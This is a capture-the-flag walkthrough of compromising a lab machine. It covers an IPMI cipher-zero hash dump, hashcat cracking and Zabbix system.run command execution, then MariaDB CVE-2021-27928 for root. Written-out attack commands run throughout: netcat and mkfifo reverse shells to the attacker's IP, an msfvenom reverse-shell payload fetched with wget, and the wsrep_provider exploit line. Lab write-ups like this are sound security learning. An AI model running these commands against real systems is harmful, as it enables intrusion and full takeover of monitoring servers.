# enumeration
## nmap scan
the initial nmap scan showed open http port
a second one - specifying udp - showed a different open port:
PORT    STATE SERVICE
623/udp open  asf-rmcp


## fuzzing
looking for directores with dirb,  I found two interesting ones:
/assets
/forms
--> there was a some information about a PHP Email Form, but this lead to a dead end as it was not available

## visiting the website
going to the website it showed it was _Powered by enterprise monitoring solutions based on Zabbix & Bare Metal BMC automation_

# exploit
using the IPMI exploit from this article (https://book.hacktricks.xyz/pentesting/623-udp-ipmi)

## metasploit enumeration
this showed ipmi was being used and the specific version:
```use  auxiliary/scanner/ipmi/ipmi_version```

this showed that the cipher zero is activated and can be exploited:
```use auxiliary/scanner/ipmi/ipmi_cipher_zero```
result = `[+] 10.10.11.124:623 - IPMI - VULNERABLE: Accepted a session open request for cipher zero`

the cipher zero could either be exploited with ipmitool (```apt-get install ipmitool #Install
#Using -C 0 any password is accepted
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list #Use Cipher 0 to dump a list of users
ID  Name      Callin  Link Auth   IPMI Msg   Channel Priv Limit
2   root             true    true       true       ADMINISTRATOR
3   Oper1            true    true       true       ADMINISTRATOR
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 #Change the password of root```), which would show the users and information about them or ```msf > use auxiliary/scanner/ipmi/ipmi_dumphashes``` could be used to dump the hashes immediately.

The latter revealed the following:


## cracking hash found
run hashcat from within the following directory ```/usr/local/Cellar/hashcat/6.2.5/share/hashcat/OpenCL```
command:
```hashcat -a 0 -m 7300 /Users/hedmaar/Documents/hacking/shibbolethHash.txt /Users/hedmaar/Documents/hacking/rockyou.txt```
result:
```70123cc9020a0000623bdf45118ff4c7ad5f363fc9979163dcb6af541526ae8214404ac85b811f91a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:e77e42065e24f1e6eaafbb6956aa5a2ca7a23561:ilovepumkinpie1```

## finding entry point
logging in with the credentials *Administrator:ilovepumkinpie1*
I navigated to `configuration > hosts`. 
The interesting part are the `items > create item`.
So proceeded to create a new one 


from (https://www.zabbix.com/documentation/current/en/manual/config/items/itemtypes/zabbix_agent) it is the system.run which is interesting, as it allows to run commands such as `=> system.run[ls -l /] → detailed file list of root directory`  on the host.

## reverse shell
(https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
Now the aim was to get a reverse shell. So by executing a command on the system using `system.run` with the reverse shell command `nc -e /bin/sh 10.10.14.111 4444` and then setting up a listener with `nc -nlvp 4444 `. This did not work, so I tried the following instead in the *key* field:`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.111 4444 >/tmp/f` and used `nowait` as the mode.
Then `Test > get value` and we got a shell:
_connect to [10.10.14.111] from (UNKNOWN) [10.10.11.124] 52520
/bin/sh: 0: can't access tty; job control turned off
$_

# getting user flag
looks like I do not have read access to /home/ipmi-svc/user.txt...
Escalaing to the ipmi-svc user I first tried to use the already found Administrator password, which worked, but the shell ended up being very unstable, so I upgraded to a fully interactive tty using `python3 -c 'import pty; pty.spawn("/bin/bash")'`.



### user flag
7a644ae54d69df1b76f10390788f3c06

# privilege escalation
resing the `/etc/passwd` file I can see MySQL is running.
`mysql  Ver 15.1 Distrib 10.3.25-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2`
Searching Google for `10.3.25-MariaDB exploit` revealed CVE-2021-27928, which is the same as the first result when searching for MariaDB in searchsploit.

So I proceeded to try to follow (https://github.com/Al1ex/CVE-2021-27928).

## finding DB credentials
The following command is good for finding interesting files without running LINPeas
`find / -type f -group ipmi-svc ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null`. The results were:
_-rw-rw-r-- 1 ipmi-svc ipmi-svc 476 Apr 13 12:08 /tmp/elf
-rw-r--r-- 1 ipmi-svc ipmi-svc 0 Apr 24  2021 /home/ipmi-svc/.cache/motd.legal-displayed
-rw-rw-r-- 1 ipmi-svc ipmi-svc 22 Apr 24  2021 /home/ipmi-svc/.vimrc
-rw-r--r-- 1 ipmi-svc ipmi-svc 220 Apr 24  2021 /home/ipmi-svc/.bash_logout
-rw-r--r-- 1 ipmi-svc ipmi-svc 807 Apr 24  2021 /home/ipmi-svc/.profile
-rw-r--r-- 1 ipmi-svc ipmi-svc 3771 Apr 24  2021 /home/ipmi-svc/.bashrc
-rw-r----- 1 ipmi-svc ipmi-svc 33 Apr 13 06:05 /home/ipmi-svc/user.txt
-rw-r----- 1 root ipmi-svc 22306 Oct 18 09:24 /etc/zabbix/zabbix_server.conf.dpkg-dist
-rw-r----- 1 root ipmi-svc 21863 Apr 24  2021 /etc/zabbix/zabbix_server.conf_

It is clear that the zabbix_server.conf is of interest so looking into it I find the credentials *zabbix:bloooarskybluh* for the zabbix DB. The host is localhost/127.0.0.1

### running linPeas:
First I cloned and built the linPeas directcory from github, set up a server in diretory with _linpeas.sh_ and then used wget to upload to the listener shell.
from here I had to `chmod +x linpeas.sh` it, and then executed it.
The interesting results were under _"Readable files belonging to root and readable to me but not world readable_ aka the _zabbix_server.conf_ file.

## create reverse shell payload + start listener
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.111 LPORT=6666 -f elf-so -o elf`
and
`nc -nvlp 6666`

## copy payload to target
set up `python3 -m http.server 8080` in /shibboleth directory. use `wget http://10.10.14.111/elf` from ipmi-svc/tmp to get file.

## execute
log into the database using `mysql -h 127.0.0.1 -u zabbix -p` then enter the password `bloooarskybluh`. Execute `SET GLOBAL wsrep_provider="/tmp/elf";` and this should spawn a shell. Upgrade to a better shell.

### system flag:
a68c35a5e03d9714a7e3664b9f9362b3

# things learnt
- "hidden" services on udp
- ipmi
- ffuf DNS searches